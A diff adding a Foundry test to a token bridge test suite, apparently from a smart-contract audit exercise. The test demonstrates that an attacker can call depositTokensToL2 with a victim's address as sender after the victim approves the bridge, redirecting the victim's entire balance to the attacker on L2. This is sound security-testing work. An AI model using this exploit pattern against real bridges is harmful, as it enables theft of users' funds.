@@ -310,4 +310,41 @@ contract L1BossBridgeTest is Test {
             tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
         }
     }
+
+    function testCanMoveApprovedTokensOfOtherUsers() public {
+        // 1. Alice will approve the bridge
+        // 2. Bob maliciously call the `depositTokensToL2` before alice
+        // using the params (from -> alice, l2Recipient -> bob, amount -> entire balance of `alice`)
+        // 3. After bob calls this function, `Deposit` event will be triggered.
+        // with following params (from -> alice, l2Recipient -> bob, amount -> entire balance of `alice` )
+        // Note: after an event in emitted, a centralized node will mint the tokens in L2 for `l2Recipient`
+        // 4. `l2Recipient` is bob, all the tokens will be minted for `bob` instead of `alice`.
+        // 5. from L2 bob can withdraw the tokens.
+
+        // let'say user is `alice`
+        // alice has starting balance of `1000000000000000000000`
+
+        uint256 userStartingBalance = token.balanceOf(user);
+
+        // now alice, approves the bridge inorder to transfer the tokens to L2
+        vm.startPrank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        vm.stopPrank();
+
+        address attacker = makeAddr("attacker");
+
+        // bob see's that alice has approved the bridge
+        // he calls `depositTokensToL2` before her
+        // bob is maliciously transferring `alice` tokens to him
+        vm.startPrank(attacker);
+        vm.expectEmit({ emitter: address(tokenBridge) });
+        emit Deposit(user, attacker, userStartingBalance);
+        tokenBridge.depositTokensToL2(user, attacker, userStartingBalance);
+        vm.stopPrank();
+
+        uint256 userEndingBalance = token.balanceOf(user);
+
+        assertEq(userEndingBalance, 0);
+        assertEq(token.balanceOf(address(vault)), userStartingBalance);
+    }
 }
